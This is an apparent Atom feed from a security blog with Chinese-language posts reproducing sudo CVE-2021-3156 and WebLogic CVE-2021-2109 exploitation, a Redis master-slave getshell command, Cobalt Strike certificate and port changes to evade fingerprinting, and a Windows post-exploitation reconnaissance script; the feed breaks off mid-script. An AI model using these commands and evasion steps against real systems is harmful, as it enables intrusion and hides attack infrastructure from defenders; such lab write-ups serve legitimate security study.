<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-02-04T05:16:34.401Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux sudo提权(CVE-2021-3156)</title>
    <link href="http://example.com/2021/02/02/Linux-sudo%E6%8F%90%E6%9D%83-CVE-2021-3156/"/>
    <id>http://example.com/2021/02/02/Linux-sudo%E6%8F%90%E6%9D%83-CVE-2021-3156/</id>
    <published>2021-02-02T09:25:02.000Z</published>
    <updated>2021-02-04T05:16:34.401Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux-sudo-权限提升-CVE-2021-3156"><a href="#Linux-sudo-权限提升-CVE-2021-3156" class="headerlink" title="Linux sudo 权限提升(CVE-2021-3156)"></a>Linux sudo 权限提升(CVE-2021-3156)</h1><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或-i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。因此只要存在sudoers文件（通常是/etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。研究人员利用该漏洞在多个Linux发行版上成功获得了完整的root权限，包括Ubuntu 20.04（sudo 1.8.31）、Debian 10（sudo 1.8.27）和Fedora 33（sudo 1.9.2），并且sudo支持的其他操作系统和Linux发行版也很容易受到攻击。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><blockquote><p>sudo 1.8.2 ~ 1.8.31p2</p><p>sudo 1.9.0 ~ 1.9.5p1</p></blockquote><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>以非 root 用户执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudoedit -s &#x2F;</span><br></pre></td></tr></table></figure><p>存在漏洞</p><p><img src="/images/image-20210202175040378.png" alt="image-20210202175040378"></p><p>不存在漏洞</p><p><img src="/images/yErg56.png" alt="img"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>工具：<a href="https://github.com/blasty/CVE-2021-3156">https://github.com/blasty/CVE-2021-3156</a></p><p>编译工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd CVE-2021-3156</span><br><span class="line"></span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>使用工具</p><p><img src="/images/image-20210202174235752.png" alt="image-20210202174235752"></p><p>提权成功</p><p><img src="/images/image-20210202174316368.png" alt="image-20210202174316368"></p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>修复升级到更新版本</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linux-sudo-权限提升-CVE-2021-3156&quot;&gt;&lt;a href=&quot;#Linux-sudo-权限提升-CVE-2021-3156&quot; class=&quot;headerlink&quot; title=&quot;Linux sudo 权限提升(CVE-2021-3156)&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="Linux提权" scheme="http://example.com/categories/Linux%E6%8F%90%E6%9D%83/"/>
    
    
  </entry>
  
  <entry>
    <title>CobaltStrike特征修改</title>
    <link href="http://example.com/2021/01/31/CobaltStrike%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9/"/>
    <id>http://example.com/2021/01/31/CobaltStrike%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9/</id>
    <published>2021-01-31T01:03:16.000Z</published>
    <updated>2021-02-04T03:29:09.479Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Cobalt-Strike-修改特征"><a href="#Cobalt-Strike-修改特征" class="headerlink" title="Cobalt Strike 修改特征"></a>Cobalt Strike 修改特征</h2><h4 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h4><p>修改默认端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim teamserver</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210130155505498.png" alt="image-20210130155505498"></p><p>将其中的server_port改成任意不冲突端口即可</p><h4 id="证书特征"><a href="#证书特征" class="headerlink" title="证书特征"></a>证书特征</h4><p>查看当前证书信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -list -v -keystore cobaltstrike.store </span><br></pre></td></tr></table></figure><p>输入默认密码123456回车，可以看到所有者、发布者中Cobalt Strike相关字样</p><p><img src="/images/image-20210130161238972.png" alt="image-20210130161238972"></p><p>通过fofa直接能搜到很多cobaltstrike的vps</p><p><img src="/images/image-20210130161652476.png" alt="image-20210130161652476"></p><p>使用nmap扫描指定ip的证书信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script ssl-cert &lt;target_ip&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210130162033753.png" alt="image-20210130162033753"></p><p>使用Keytools工具修改证书信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">keytool ‐keystore cobaltstrike.store ‐storepass 密码 ‐keypass 密码 ‐genkey ‐key</span><br><span class="line">alg RSA ‐alias google.com ‐dname &quot;CN&#x3D;(名字与姓氏), OU&#x3D;(组织单位名称), O&#x3D;(组织名</span><br><span class="line">称), L&#x3D;(城市或区域名称), ST&#x3D;(州或省份名称), C&#x3D;(单位的两字母国家代码)&quot;</span><br><span class="line"></span><br><span class="line">keytool -keystore cobaltstrike.store --storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias baidu.com -dname &quot;CN&#x3D;US, OU&#x3D;baidu.com, O&#x3D;Sofware, L&#x3D;Somewhere, ST&#x3D;Cyberspace, C&#x3D;CN&quot;</span><br></pre></td></tr></table></figure><p>可以看到修改证书信息之后，再也没有cobaltstrike 的关键字了。</p><p><img src="/images/image-20210130162519952.png" alt="image-20210130162519952"></p><p><img src="/images/image-20210130162635505.png" alt="image-20210130162635505"></p><h4 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h4><p>太重复了，就不多写了。贴出一个写的比较详细的</p><p><a href="https://www.secpulse.com/archives/148377.html">https://www.secpulse.com/archives/148377.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Cobalt-Strike-修改特征&quot;&gt;&lt;a href=&quot;#Cobalt-Strike-修改特征&quot; class=&quot;headerlink&quot; title=&quot;Cobalt Strike 修改特征&quot;&gt;&lt;/a&gt;Cobalt Strike 修改特征&lt;/h2&gt;&lt;h4 id=&quot;端</summary>
      
    
    
    
    
    <category term="工具" scheme="http://example.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Redis主从复制GetShell</title>
    <link href="http://example.com/2021/01/30/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6GetShell/"/>
    <id>http://example.com/2021/01/30/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6GetShell/</id>
    <published>2021-01-30T02:45:13.000Z</published>
    <updated>2021-02-04T05:08:18.072Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis主从复制GetShell"><a href="#Redis主从复制GetShell" class="headerlink" title="Redis主从复制GetShell"></a>Redis主从复制GetShell</h1><a id="more"></a><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>使用dockers下载redis5.0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull damonevking&#x2F;redis5.0</span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 6379:6379 -d damonevking&#x2F;redis5.0 redis-server   &#x2F;&#x2F;映射端口并运行容器</span><br></pre></td></tr></table></figure><p>在攻击机上执行</p><ul><li><a href="https://github.com/Ridter/redis-rce.git">https://github.com/Ridter/redis-rce.git</a></li><li><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a> 下载exp.so，并复制到上一个文件加中</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rce.py -r 192.168.0.5 -L 192.168.0.8 -f exp.so</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210130110621195.png" alt="image-20210130110621195"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Redis主从复制GetShell&quot;&gt;&lt;a href=&quot;#Redis主从复制GetShell&quot; class=&quot;headerlink&quot; title=&quot;Redis主从复制GetShell&quot;&gt;&lt;/a&gt;Redis主从复制GetShell&lt;/h1&gt;</summary>
    
    
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-2019</title>
    <link href="http://example.com/2021/01/24/Weblogic%20CVE-2021-2109%20RCE%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2021/01/24/Weblogic%20CVE-2021-2109%20RCE%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-01-24T12:57:20.000Z</published>
    <updated>2021-01-25T01:52:53.756Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Weblogic-CVE-2021-2109-RCE复现"><a href="#Weblogic-CVE-2021-2109-RCE复现" class="headerlink" title="Weblogic CVE-2021-2109 RCE复现"></a>Weblogic CVE-2021-2109 RCE复现</h2><h3 id="Weblogic-介绍"><a href="#Weblogic-介绍" class="headerlink" title="Weblogic 介绍"></a>Weblogic 介绍</h3><p>Weblogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JavaEE架构的中间件，Weblogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。</p><a id="more"></a><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>2021年1月20日，绿盟科技监测发现Oracle官方发布了2021年1月关键补丁更新公告CPU（Critical Patch Update），共修复了329个不同程度的漏洞，其中包括7个影响WebLogic的严重漏洞（CVE-2021-1994、CVE-2021-2047、CVE-2021-2064、CVE-2021-2108、CVE-2021-2075、CVE-2019-17195、CVE-2020-14756），未经身份验证的攻击者可通过此次的漏洞实现远程代码执行。CVSS评分均为9.8，利用复杂度低。建议用户尽快采取措施，对上述漏洞进行防护。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><blockquote><p>WebLogic 10.3.6.0.0</p><p>WebLogic 12.1.3.0.0</p><p>WebLogic 12.2.1.3.0</p><p>WebLogic 12.2.1.4.0</p><p>WebLogic 14.1.1.0.0</p></blockquote><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><strong>weblogic下载地址</strong>：<a href="https://www.oracle.com/middleware/technologies/fusionmiddleware-downloads.html">https://www.oracle.com/middleware/technologies/fusionmiddleware-downloads.html</a></p><p>将下载下来的weblogic解压，以管理员身份运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar fmw_14.1.1.0.0_wls_lite_quick_generic.jar</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images20210125094505.png" alt="image-20210124201521669"></p><p>此时，已经安装好了，会在当前目录下生成一个文件夹<code>wls1411</code>。</p><p>打开目录<code>F:\Program_Files\weblogic\wls1411\oracle_common\common\bin</code>，运行<code>config.cmd</code></p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images20210125094934.png" alt="image-20210124201800268"></p><p>默认下一步即可</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images20210125094951.png" alt="image-20210124201917340"></p><p>上面配置号后，会在<code>wls1411</code>文件夹下生成一个新的<code>user_projects</code>文件夹，在其下面<code>domains\base_domain\</code>中运行<code>startWebLogic.cmd</code>就可以启动<code>weblogic</code>服务。</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images20210125094812.png" alt="image-20210124202305770"></p><p>访问本地<code>http://127.0.0.1:7001/console/login/LoginForm.jsp</code></p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images20210125094813.png" alt="image-20210124202355447"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>利用条件：</strong>需要知道登录密码</p><p><strong>使用的工具</strong></p><p><strong>JNDI-Injection-Exploit</strong>：<a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar">https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</a></p><p><strong>CVE-2021-2109.py</strong>：<a href="https://www.exploit-db.com/exploits/49461">https://www.exploit-db.com/exploits/49461</a></p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images20210125095104.png" alt="image-20210124202724619"></p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>赶紧打上补丁。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Weblogic-CVE-2021-2109-RCE复现&quot;&gt;&lt;a href=&quot;#Weblogic-CVE-2021-2109-RCE复现&quot; class=&quot;headerlink&quot; title=&quot;Weblogic CVE-2021-2109 RCE复现&quot;&gt;&lt;/a&gt;Weblogic CVE-2021-2109 RCE复现&lt;/h2&gt;&lt;h3 id=&quot;Weblogic-介绍&quot;&gt;&lt;a href=&quot;#Weblogic-介绍&quot; class=&quot;headerlink&quot; title=&quot;Weblogic 介绍&quot;&gt;&lt;/a&gt;Weblogic 介绍&lt;/h3&gt;&lt;p&gt;Weblogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JavaEE架构的中间件，Weblogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Weblogic" scheme="http://example.com/tags/Weblogic/"/>
    
  </entry>
  
  <entry>
    <title>windows信息收集</title>
    <link href="http://example.com/2020/12/17/windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://example.com/2020/12/17/windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2020-12-17T14:54:36.000Z</published>
    <updated>2020-12-17T14:59:10.269Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Windows-信息收集"><a href="#Windows-信息收集" class="headerlink" title="Windows 信息收集"></a>Windows 信息收集</h1><p>作为一个想偷懒的人，必然就想写个脚本对信息收集，免得自己丢三落四。然而，知道python打包的exe文件大，不知道这么大。于是只有个半成品。</p><a id="more"></a><p>python 源码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> <span class="built_in">compile</span>, sub, DOTALL</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getInformation</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.hostName = <span class="literal">None</span></span><br><span class="line">        self.registerName = <span class="literal">None</span></span><br><span class="line">        self.domainWork = <span class="literal">None</span></span><br><span class="line">        self.patches = <span class="literal">None</span></span><br><span class="line">        self.allUser = <span class="literal">None</span></span><br><span class="line">        self.OnlineUser = <span class="literal">None</span></span><br><span class="line">        self.currentUser = <span class="literal">None</span></span><br><span class="line">        self.currentUserGroup = <span class="literal">None</span></span><br><span class="line">        self.AVName = <span class="literal">None</span></span><br><span class="line">        self.shareList = <span class="literal">None</span></span><br><span class="line">        self.OS = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">userOpt</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 获取所有用户</span></span><br><span class="line">        response = Popen(<span class="string">&quot;net user&quot;</span>, shell=<span class="literal">True</span>, stdout=PIPE)</span><br><span class="line">        result = response.stdout.read().decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(result)</span></span><br><span class="line"></span><br><span class="line">        pattern1 = <span class="string">r&#x27;.*?---\r\n(.*?)命令成功&#x27;</span></span><br><span class="line">        allUsers = <span class="built_in">compile</span>(pattern1, DOTALL)</span><br><span class="line">        allUser = allUsers.findall(result)[<span class="number">0</span>].replace(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        allUser = sub(<span class="string">&#x27; +&#x27;</span>, <span class="string">&#x27; | &#x27;</span>, allUser)</span><br><span class="line">        <span class="comment"># print(allUser)</span></span><br><span class="line">        self.allUser = allUser</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 查询当前用户</span></span><br><span class="line">        response = Popen(<span class="string">&quot;whoami&quot;</span>, shell=<span class="literal">True</span>, stdout=PIPE)</span><br><span class="line">        result = response.stdout.read().decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        pattern1 = <span class="string">r&#x27;.*?\\(.*?)\r\n&#x27;</span></span><br><span class="line">        currentUsers = <span class="built_in">compile</span>(pattern1, DOTALL)</span><br><span class="line">        currentUser = currentUsers.findall(result)[<span class="number">0</span>].replace(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;&quot;</span>).strip()</span><br><span class="line">        self.currentUser = currentUser</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 查询当前用户所属组</span></span><br><span class="line">        response = Popen(<span class="string">&quot;net user &quot;</span>+self.currentUser, shell=<span class="literal">True</span>, stdout=PIPE)</span><br><span class="line">        result = response.stdout.read().decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        pattern1 = <span class="string">r&#x27;.*?本地组成员 \s+(\*.*?)\r\n&#x27;</span></span><br><span class="line">        currentUserGroups = <span class="built_in">compile</span>(pattern1, DOTALL)</span><br><span class="line">        currentUserGroup = currentUserGroups.findall(result)[<span class="number">0</span>].replace(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;&quot;</span>).strip()</span><br><span class="line">        self.currentUserGroup = currentUserGroup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 查询在线用户</span></span><br><span class="line">        response = Popen(<span class="string">&quot;query user | quser&quot;</span>, shell=<span class="literal">True</span>, stdout=PIPE)</span><br><span class="line">        result = response.stdout.read().decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        pattern1 = <span class="string">r&#x27;.*?&gt;(.*?) &#x27;</span></span><br><span class="line">        OnlineUsers = <span class="built_in">compile</span>(pattern1, DOTALL)</span><br><span class="line">        OnlineUser = OnlineUsers.findall(result)[<span class="number">0</span>].replace(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;&quot;</span>).strip()</span><br><span class="line">        self.OnlineUser = OnlineUser</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">SystemInfo</span>(<span class="params">self</span>):</span></span><br><span class="line">        response = Popen(<span class="string">&quot;systeminfo&quot;</span>, shell=<span class="literal">True</span>, stdout=PIPE)</span><br><span class="line">        result = response.stdout.read().decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获取主机名</span></span><br><span class="line">        pattern1 = <span class="string">r&#x27;.*?主机名:\s+(.*?)\r\n&#x27;</span></span><br><span class="line">        hostNames = <span class="built_in">compile</span>(pattern1, DOTALL)</span><br><span class="line">        hostName = hostNames.findall(result)</span><br><span class="line">        self.hostName = hostName[<span class="number">0</span>].strip()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获取用户名</span></span><br><span class="line">        pattern2 = <span class="string">r&#x27;.*?注册的所有人:   (.*?)\r\n&#x27;</span></span><br><span class="line">        registerNames = <span class="built_in">compile</span>(pattern2, DOTALL)</span><br><span class="line">        registerName = registerNames.findall(result)</span><br><span class="line">        self.registerName = registerName[<span class="number">0</span>].strip()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获取工作组名或域名</span></span><br><span class="line">        pattern3 = <span class="string">r&#x27;.*?域:\s+(.*?)\r\n&#x27;</span></span><br><span class="line">        domainWorks = <span class="built_in">compile</span>(pattern3, DOTALL)</span><br><span class="line">        domainWork = domainWorks.findall(result)</span><br><span class="line">        self.domainWork = domainWork[<span class="number">0</span>].strip()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获取补丁信息</span></span><br><span class="line">        pattern4 = <span class="string">r&#x27;.*?\[\d+\]: (KB\d&#123;7&#125;)\r\n&#x27;</span></span><br><span class="line">        patches = <span class="built_in">compile</span>(pattern4, DOTALL)</span><br><span class="line">        patchName = patches.findall(result)</span><br><span class="line">        self.patches = patchName</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获取OS名称和版本</span></span><br><span class="line">        pattern5 = <span class="string">r&#x27;.*?OS 名称:\s+ (.*?)\r\nOS&#x27;</span></span><br><span class="line">        OS = <span class="built_in">compile</span>(pattern5, DOTALL)</span><br><span class="line">        OSName = OS.findall(result)[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">        pattern6 = <span class="string">r&#x27;.*?OS 版本:\s+ (.*?)\r\nOS&#x27;</span></span><br><span class="line">        OSVersion = <span class="built_in">compile</span>(pattern6, DOTALL)</span><br><span class="line">        OSVersion = OSVersion.findall(result)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(OSName + &quot; &quot; + OSVersion)</span></span><br><span class="line">        self.OS = OSName + <span class="string">&quot; &quot;</span> + OSVersion</span><br><span class="line">        <span class="comment"># self.OS = OS</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">AntiVirusList</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 获取杀软名称</span></span><br><span class="line">        response = Popen(<span class="string">&quot;wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct GET displayName&quot;</span>, shell=<span class="literal">True</span>, stdout=PIPE)</span><br><span class="line">        result = response.stdout.read().decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">        AVs = result.split(<span class="string">&#x27;\r\r\n&#x27;</span>)</span><br><span class="line">        AVs = <span class="built_in">set</span>([item.strip() <span class="keyword">for</span> item <span class="keyword">in</span> AVs[<span class="number">1</span>:-<span class="number">2</span>]])</span><br><span class="line">        self.AVName = AVs</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">NetShare</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 获取共享资源</span></span><br><span class="line">        response = Popen(<span class="string">&quot;net share&quot;</span>, shell=<span class="literal">True</span>, stdout=PIPE)</span><br><span class="line">        result = response.stdout.read().decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        pattern = <span class="string">r&#x27;.*?---\r\n(.*?)\r\n命令&#x27;</span></span><br><span class="line">        shareList = <span class="built_in">compile</span>(pattern, DOTALL)</span><br><span class="line">        shareList = shareList.findall(result)[<span class="number">0</span>]</span><br><span class="line">        shareList = <span class="string">&#x27; &#x27;</span>.join(shareList.split())</span><br><span class="line">        self.shareList = shareList</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">runCommand</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.NetShare()</span><br><span class="line">        self.AntiVirusList()</span><br><span class="line">        self.userOpt()</span><br><span class="line">        self.SystemInfo()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printInfo</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;[*]系统信息:&quot;</span>.ljust(<span class="number">15</span>), self.OS)</span><br><span class="line">        print(<span class="string">&quot;[-]&quot;</span>,<span class="string">&quot;-&quot;</span>*<span class="number">100</span>)</span><br><span class="line">        print(<span class="string">&quot;[*]当前主机名:&quot;</span>.ljust(<span class="number">15</span>), self.hostName)</span><br><span class="line">        print(<span class="string">&quot;[-]&quot;</span>,<span class="string">&quot;-&quot;</span>*<span class="number">100</span>)</span><br><span class="line">        print(<span class="string">&quot;[*]域/工作组:&quot;</span>.ljust(<span class="number">15</span>), self.domainWork)</span><br><span class="line">        print(<span class="string">&quot;[-]&quot;</span>,<span class="string">&quot;-&quot;</span>*<span class="number">100</span>)</span><br><span class="line">        print(<span class="string">&quot;[*]当前注册人:&quot;</span>.ljust(<span class="number">15</span>), self.registerName)</span><br><span class="line">        print(<span class="string">&quot;[-]&quot;</span>,<span class="string">&quot;-&quot;</span>*<span class="number">100</span>)</span><br><span class="line">        print(<span 